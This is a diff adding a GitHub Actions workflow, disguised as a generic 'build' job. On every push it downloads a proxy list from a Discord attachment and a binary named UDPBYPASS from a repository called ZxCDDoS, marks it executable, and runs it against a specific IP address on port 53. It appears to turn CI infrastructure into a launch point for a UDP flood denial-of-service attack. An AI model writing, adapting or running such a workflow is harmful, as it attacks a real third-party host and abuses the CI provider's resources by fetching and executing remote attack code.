@@ -1,0 +1,28 @@
+name: Cl
+
+on:
+  push:
+  workflow_dispatch:
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - name: Checkout repository
+        uses: actions/checkout@v2
+
+      - name: Download proxy.txt
+        run: |
+          curl -L -o proxy.txt 'https://cdn.discordapp.com/attachments/1260747522541092995/1262114823982813296/proxy.txt?ex=66956b86&is=66941a06&hm=102e33ea946e1576cf623008baa9f1002963e0533308bdca2af9cff8b8121d01&'
+
+
+      - name: Download UDPBYPASS
+        run: |
+          curl -L -o UDPBYPASS 'https://github.com/hoaan1995/ZxCDDoS/raw/main/UDPBYPASS'
+
+      - name: Make UDPBYPASS executable
+        run: chmod 777 UDPBYPASS
+
+      - name: Run UDPBYPASS
+        run: ./UDPBYPASS 102.210.254.164 53
